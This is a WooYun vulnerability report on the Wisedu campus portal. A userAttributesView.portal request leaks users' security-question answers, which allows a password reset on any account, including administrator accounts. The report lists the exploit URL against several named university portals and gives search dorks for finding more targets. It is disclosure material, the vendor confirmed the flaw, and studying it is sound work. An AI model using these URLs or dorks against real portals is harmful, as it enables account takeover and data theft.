{"id": 46358, "wybug_id": "wooyun-2014-084779", "wybug_title": "金智教育信息门户设计问题可导致重置任意用户密码（自相矛盾的设计）", "wybug_corp": "wisedu.com", "wybug_author": "浮萍", "wybug_date": "2014-11-28 16:53", "wybug_open_date": "2015-02-26 16:54", "wybug_type": "非授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-06：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-01-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-26：\t细节向公众公开  简要描述： 重置任意任意人员密码包括管理员哦 详细说明：  在一次登录校园信息门户的时候发现了一个post请求我给拼写成get形式如XXX.edu.cn/userAttributesView.portal?userId=xxxx这里以某高校为例userId这里取portal（门户管理员）\n\n返回json代码json包含该用户设置密码的邮箱、出生日期、和密保问题等信息我们访问xx.edu.cn/getBackPassword.portal进行找回密码操作\n\n选择\n通过回答问题新设密码\n\n\n我们将账号和生日填上发现匹配\n\n然后填写密保问题答案\n\n发现竟然可以修改密码这里用一个错误的答案试试\n\n发现提示答案错误由于这个是管理员账号，所以就不进行修改了我们找一个可以登陆的账号试试登陆后访问xx.edu.cn/userAttributesEdit.portal查看个人信息设置\n\n发现设置的答案与json返回的一致   漏洞证明：  金智教育的信息门户用户比较多这里举几例\nhttp://i.xmu.edu.cn/userAttributesView.portal?userId=amAdminhttp://jyxt.njmu.edu.cn/userAttributesView.portal?userId=amAdminhttp://yx.nuaa.edu.cn/userAttributesView.portal?userId=amAdminhttp://yx.urp.seu.edu.cn/userAttributesView.portal?userId=yxadminhttp://tj91.tongji.edu.cn/userAttributesView.portal?userId=amAdminhttp://student.tongji.edu.cn/userAttributesView.portal?userId=amAdminhttp://jy.gdufs.edu.cn/userAttributesView.portal?userId=adminhttp://portal.uestc.edu.cn/userAttributesView.portal?userId=amAdminhttp://urp.ouc.edu.cn/userAttributesView.portal?userId=portalhttp://my.njtvu.edu.cn/userAttributesView.portal?userId=portalhttp://i.mju.edu.cn/userAttributesView.portal?userId=amAdmin\n大多数管理员的id为amAdmin或者portal即使找不到该userId也可以通过其他方法来获取该校任意一名学生的学号然后以此来重置其密码登陆后采用\n WooYun: 某教育门户系统漏洞可能导致大量学生信息泄露 \n中的方法获取其他人的userid  然后修改密码厦门大学http://i.xmu.edu.cn/userAttributesView.portal?userId=amAdmin\n\n南京航空http://yx.nuaa.edu.cn/userAttributesView.portal?userId=amAdmin\n\n---------东南大学http://yx.urp.seu.edu.cn/userAttributesView.portal?userId=yxadmin\n\n-----------------同济大学就业信息网http://tj91.tongji.edu.cn/userAttributesView.portal?userId=amAdmin\n\n------------电子科技大学http://portal.uestc.edu.cn/userAttributesView.portal?userId=amAdmin\n\n--------------------http://my.njtvu.edu.cn/userAttributesView.portal?userId=portal\n\n就举这么几个例子吧更多可以自行构造关键字搜索如\ninurl:edu.cn/getBackPasswordByQuestion.portalinurl:index.portal intext:信息门户 site:edu.cn\n   修复方案：     版权声明：转载请注明来源 浮萍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-12-03 15:15 厂商回复： 此漏洞输入URL非授权访问,已联系产品线在处理 最新状态： 2015-08-12：此漏洞已修复，非常感谢  ", "replys": "漏洞评价：\n评论\n     2015-02-26 18:31 |    \t\t龙帝 \t\t\t( 实习白帽子  |\t\t\t        Rank:39 漏洞数:12        )\t\t \n  。。这样才中 为洞主不值    \n     2015-02-27 08:54 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:555 漏洞数:118        | 默默潜水)\t\t \n  @龙帝 0.0的确是小问题引发的大问题    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}